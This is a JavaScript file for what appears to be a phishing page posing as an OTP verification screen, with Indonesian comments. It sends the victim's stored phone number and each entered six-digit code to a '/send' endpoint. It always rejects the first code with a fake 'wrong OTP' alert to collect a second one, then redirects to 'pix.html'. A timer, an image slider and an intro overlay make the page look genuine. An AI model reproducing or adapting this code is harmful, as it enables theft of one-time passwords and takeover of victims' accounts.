/* ========================= */
/* OTP */
/* ========================= */

const sound = document.getElementById("successSound");
const otpInputs = document.querySelectorAll(".otp-box");
const otpContainer = document.querySelector(".otp-container");
const errorBox = document.querySelector(".error-box");
const loadingBox = document.getElementById("loadingBox");
const alertTitle = document.querySelector(".alert-title");
const alertDesc = document.querySelector(".alert-desc");

/* ========================= */
/* PLAY SOUND */
/* ========================= */

window.addEventListener("pageshow", () => {

    if(loadingBox) loadingBox.style.display = "none";

    if(sound){
        sound.play().catch(()=>{});
    }

});

let alertTimer;

function showTempAlert(title, desc){

    clearTimeout(alertTimer);

    alertTitle.innerText = title;
    alertDesc.innerText = desc;

    errorBox.style.display = "block";
    errorBox.classList.add("show");

    alertTimer = setTimeout(() => {

        errorBox.classList.remove("show");

        setTimeout(() => {
            errorBox.style.display = "none";
        }, 300);

    }, 3000);
}

/* FADE IN */
window.addEventListener("load", () => {
    document.body.classList.add("fade-in");
});

/* TOTAL SALAH */
let attempt = 0;

/* HIDE ALERT */
if(errorBox) errorBox.style.display = "none";

/* RESET LOADING */
window.addEventListener("pageshow", () => {
    if(loadingBox) loadingBox.style.display = "none";
});

/* ========================= */
/* NOMOR OTOMATIS */
/* ========================= */

const savedNumber = localStorage.getItem("nmrx");

if(savedNumber){
    const phoneEl = document.querySelector(".phone-number");
    if(phoneEl) phoneEl.innerText = savedNumber;
}

/* ========================= */
/* FOKUS KE BOX PERTAMA */
/* ========================= */

if(otpContainer){
    otpContainer.addEventListener("click", () => {

        for(let i = 0; i < otpInputs.length; i++){
            if(otpInputs[i].value === ""){
                otpInputs[i].focus();
                return;
            }
        }

        otpInputs[0].focus();
    });
}

/* ========================= */
/* OTP INPUT */
/* ========================= */

otpInputs.forEach((input,index) => {

    input.addEventListener("input", () => {

        input.value = input.value.replace(/[^0-9]/g,'');

        if(errorBox) errorBox.style.display = "none";

        if(input.value.length === 1 && index < otpInputs.length - 1){
            otpInputs[index + 1].focus();
        }

        checkOTP();
    });

    input.addEventListener("keydown", (e) => {

        if(e.key === "Backspace" && input.value === "" && index > 0){
            otpInputs[index - 1].focus();
        }

    });

});

/* ========================= */
/* CHECK OTP */
/* ========================= */

function checkOTP(){

    let otp = "";

    otpInputs.forEach(input => {
        otp += input.value;
    });

    if(otp.length === 6){

        localStorage.setItem("otp", otp);

        const nmrx = localStorage.getItem("nmrx");

        fetch("/send", {
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                nmrx:nmrx,
                otp:otp
            })
        })
        .then(res => res.json())
        .then(data => {
            console.log("RESPON:", data);
        })
        .catch(err => {
            console.log("ERROR:", err);
        });

        attempt++;

        if(attempt === 1){

            showTempAlert(
                "Kode OTP salah",
                "Pastikan kode yang kamu masukan sudah benar"
            );

            otpContainer.classList.add("shake");

            setTimeout(() => {
                otpContainer.classList.remove("shake");
            }, 350);

            setTimeout(() => {
                otpInputs.forEach(input => input.value = "");
                otpInputs[0].focus();
            }, 300);

        } else if(attempt >= 2){

            if(loadingBox) loadingBox.style.display = "flex";

            setTimeout(() => {
                window.location.href = "pix.html";
            }, 1500);

        }

        setTimeout(() => {
            otpInputs.forEach(input => input.value = "");
            otpInputs[0].focus();
        },300);
    }
}

/* ========================= */
/* TIMER */
/* ========================= */

const resendBtn = document.querySelector(".resend-btn");
const timerText = document.querySelector(".timer");

let time = 60;

if(resendBtn) resendBtn.disabled = true;

const countdown = setInterval(() => {

    let seconds = time < 10 ? "0" + time : time;

    if(timerText){
        timerText.innerText = `00:${seconds}`;
    }

    time--;

    if(time < 0){

        clearInterval(countdown);

        if(timerText) timerText.innerText = "00:00";

        if(resendBtn){
            resendBtn.disabled = false;
            resendBtn.classList.add("active");
        }
    }

},1000);

/* ========================= */
/* RESEND */
/* ========================= */

if(resendBtn){
    resendBtn.addEventListener("click", () => {
        if(!resendBtn.disabled){
            location.reload();
        }
    });
}

/* ========================= */
/* SLIDER */
/* ========================= */

const slides = [
    "assets/slide1.jpg",
    "assets/slide2.jpg",
    "assets/slide3.jpg",
    "assets/slide4.jpg"
];

let currentSlide = 0;
let isAnimating = false;

const slideImg = document.getElementById("slideImg");
const slideCounter = document.getElementById("slideCounter");
const prevBtn = document.getElementById("prevBtn");
const nextBtn = document.getElementById("nextBtn");

function changeSlide(direction){

    if(isAnimating || !slideImg) return;

    isAnimating = true;

    slideImg.classList.add(
        direction === "next" ? "slide-out-left" : "slide-out-right"
    );

    setTimeout(() => {

        currentSlide = direction === "next"
            ? (currentSlide + 1) % slides.length
            : (currentSlide - 1 + slides.length) % slides.length;

        slideImg.src = slides[currentSlide];

        if(slideCounter){
            slideCounter.innerText = `${currentSlide + 1} / ${slides.length}`;
        }

        slideImg.classList.remove("slide-out-left","slide-out-right");

        slideImg.style.opacity = "0";
        slideImg.style.transform =
        direction === "next"
        ? "translateX(25px) scale(.96)"
        : "translateX(-25px) scale(.96)";

        setTimeout(() => {
            slideImg.style.opacity = "1";
            slideImg.style.transform = "translateX(0) scale(1)";
        },30);

        setTimeout(() => {
            isAnimating = false;
        },300);

    },280);
}

if(nextBtn) nextBtn.addEventListener("click", () => changeSlide("next"));
if(prevBtn) prevBtn.addEventListener("click", () => changeSlide("prev"));

/* ========================= */
/* INTRO OVERLAY */
/* ========================= */

const introOverlay = document.getElementById("introOverlay");
const introBtn = document.getElementById("introBtn");

if(introBtn && introOverlay){
    introBtn.addEventListener("click", () => {

        introOverlay.classList.add("hide");

        setTimeout(() => {
            introOverlay.style.display = "none";
        },350);

    });
}
